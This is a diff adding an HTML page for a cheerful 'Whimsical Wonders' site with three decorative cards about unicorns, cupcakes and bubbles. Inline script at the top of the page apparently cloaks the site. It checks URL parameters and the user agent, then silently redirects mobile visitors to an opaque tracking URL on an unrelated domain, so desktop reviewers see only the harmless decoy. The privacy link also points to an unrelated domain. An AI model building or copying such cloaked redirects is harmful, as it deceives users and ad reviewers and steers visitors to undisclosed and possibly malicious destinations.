@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Whimsical Wonders</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4, #ffecd2);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #ff6b6b;
+            padding: 20px;
+            text-align: center;
+            color: #fff;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: #fff;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transform: rotate(3deg);
+        }
+        footer {
+            background-color: #4ecdc4;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #fff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Whimsical Wonders!</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Magical Unicorns</h2>
+            <p>Discover the enchanting world of sparkly unicorns!</p>
+        </div>
+        <div class="card">
+            <h2>Rainbow Cupcakes</h2>
+            <p>Indulge in our delicious and colorful treats!</p>
+        </div>
+        <div class="card">
+            <h2>Bubble Gum Dreams</h2>
+            <p>Experience the sweetest dreams with our magical bubbles!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Whimsical Wonders | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
